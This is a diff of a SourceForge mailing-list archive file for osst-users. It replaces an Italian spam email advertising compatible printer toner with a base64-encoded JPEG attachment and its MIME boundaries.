+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAMjAyMDowNjoxNiAwNToyMjozMgAyMDIwOjA2OjE2IDA1OjIy
+OjMyAAAASgBFAFMASwBZAAAA/+ELGGh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8APD94
+cGFja2V0IGJlZ2luPSfvu78nIGlkPSdXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQnPz4NCjx4
+OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iPjxyZGY6UkRGIHhtbG5zOnJkZj0i
+aHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+PHJkZjpEZXNj
+cmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1
+MTgyZjFiIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iLz48
+cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0idXVpZDpmYWY1YmRkNS1iYTNkLTExZGEtYWQz
+MS1kMzNkNzUxODJmMWIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4w
+LyI+PHhtcDpDcmVhdGVEYXRlPjIwMjAtMDYtMTZUMDU6MjI6MzIuMDEyPC94bXA6Q3JlYXRl
+RGF0ZT48L3JkZjpEZXNjcmlwdGlvbj48cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0idXVp
+ZDpmYWY1YmRkNS1iYTNkLTExZGEtYWQzMS1kMzNkNzUxODJmMWIiIHhtbG5zOmRjPSJodHRw
+Oi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+PGRjOmNyZWF0b3I+PHJkZjpTZXEgeG1s
+bnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj48
+cmRmOmxpPkpFU0tZPC9yZGY6bGk+PC9yZGY6U2VxPg0KCQkJPC9kYzpjcmVhdG9yPjwvcmRm
+OkRlc2NyaXB0aW9uPjwvcmRmOlJERj48L3g6eG1wbWV0YT4NCiAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD94cGFja2V0IGVuZD0ndyc/Pv/b
+AEMABwUFBgUEBwYFBggHBwgKEQsKCQkKFQ8QDBEYFRoZGBUYFxseJyEbHSUdFxgiLiIlKCkr
+LCsaIC8zLyoyJyorKv/bAEMBBwgICgkKFAsLFCocGBwqKioqKioqKioqKioqKioqKioqKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqKv/AABEIAEwAPAMBIgACEQEDEQH/xAAfAAAB
+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
 
-Vendita toner compatibili. Direttamente dal produttore al consumatore con o=
-ttimo rapporto prezzo/qualita'
 
-=20
-
-Garanzia soddisfatti o rimborsati ed offriamo anche possibilita' di pagamen=
-to alla consegna al corriere oppure bonifico anticipato. Trattiamo anche to=
-ner originali=20
-
-=20
-
-Rispondi a questa email indicando il modello della tua stampante, ti invier=
-emo un preventivo
-
-=20
-
-Se rispondi a questa email ti invieremo anche tutti i nostri contatti azien=
-dali e le nostre recensioni. Se hai problemi a rispondere a questa email, c=
-rea un nuovo messaggio inserendo il nostro indirizzo come destinatario
-
-=20
-
-=20
-
-Se hai ricevuto questa email per errore, per favore comunicacelo, Nel caso =
-desideri essere cancellato rispondi a questa email con "cancellami" Oppure =
-premi qui ed invia per cancellarti
-
-=20
+------=_NextPart_000_0012_E3CCF698.3B05278C--
 
 
-------=_NextPart_001_60D1_038B21F7.5ED41C0A
-Content-Type: text/html; charset="utf-8"
-Content-Transfer-Encoding: quoted-printable
 
-<HEAD><TITLE></TITLE>
-<META content=3D"text/html; charset=3Dutf-8" http-equiv=3DContent-Type>
-<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
-<BODY>
-<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
-<TR>
-<TD style=3D"TEXT-ALIGN: center" width=3D"100%">
-<P>&nbsp;</P>
-<TABLE style=3D"BORDER-TOP: #808080 1px solid; FONT-FAMILY: 'Times New Roma=
-n', Times, serif; BORDER-RIGHT: #808080 1px solid; WIDTH: 600px; BORDER-BOT=
-TOM: #808080 1px solid; TEXT-ALIGN: left; BORDER-LEFT: #808080 1px solid; M=
-ARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
-<TR>
-<TD style=3D"FONT-SIZE: 18px; FONT-FAMILY: 'Times New Roman', Times, serif;=
- COLOR: #6e6d6d; PADDING-BOTTOM: 25px; PADDING-TOP: 25px; PADDING-LEFT: 25p=
-x; PADDING-RIGHT: 25px"><IMG border=3D0 hspace=3D0 src=3D"https://imageshac=
-k.com/img924/4015/5bVSBq.jpg" width=3D650 height=3D270>=20
-<P>&nbsp;</P>
-<UL>
-<LI><FONT color=3D#ff0000 size=3D5>Vendita toner compatibili. Direttamente =
-dal produttore al consumatore con ottimo rapporto prezzo/qualita'</FONT>=20
-<P>&nbsp;</P>
-<LI>Garanzia soddisfatti o rimborsati ed offriamo anche possibilita' di pag=
-amento alla consegna al corriere oppure bonifico anticipato. Trattiamo anch=
-e toner originali&nbsp;=20
-<P>&nbsp;</P>
-<LI><A href=3D"mailto:tonertoplevel@gmail.com=3Fsubject=3Dpreventivo"><FONT=
- color=3D#ff0000 size=3D5><STRONG>Rispondi a questa email indicando il mode=
-llo della tua stampante, ti invieremo un preventivo</STRONG></FONT></A>=20
-<P>&nbsp;</P>
-<LI>Se rispondi a questa email ti invieremo anche tutti i nostri contatti a=
-ziendali e le nostre recensioni. Se hai problemi a rispondere a questa emai=
-l, crea un nuovo messaggio inserendo il nostro indirizzo come destinatario =
-</LI></UL>
-<P>&nbsp;</P><IMG style=3D"HEIGHT: 350px; WIDTH: 650px" border=3D2 hspace=
-=3D0 alt=3D"" src=3D"https://imageshack.com/img921/548/j6yJq3.jpg" width=3D=
-650 height=3D350>=20
-<P>&nbsp;</P><FONT size=3D2>Se hai ricevuto questa email per errore, per fa=
-vore comunicacelo, Nel caso desideri essere cancellato rispondi a questa em=
-ail con "cancellami" </FONT><A href=3D"mailto:tonertoplevel@gmail.com=3Fsub=
-ject=3DCancellami"><FONT size=3D2>Oppure premi qui ed invia per cancellarti=
-</FONT></A></TD></TR>
-<TR></TR></TABLE></TD></TR></TABLE>
-<P>&nbsp;</P></BODY>
-------=_NextPart_001_60D1_038B21F7.5ED41C0A--
-
-
---===============3500438600030256701==
+--===============4729712888160276887==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============3500438600030256701==
+--===============4729712888160276887==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -220,5 +424,6 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============3500438600030256701==--
+--===============4729712888160276887==--
+
 
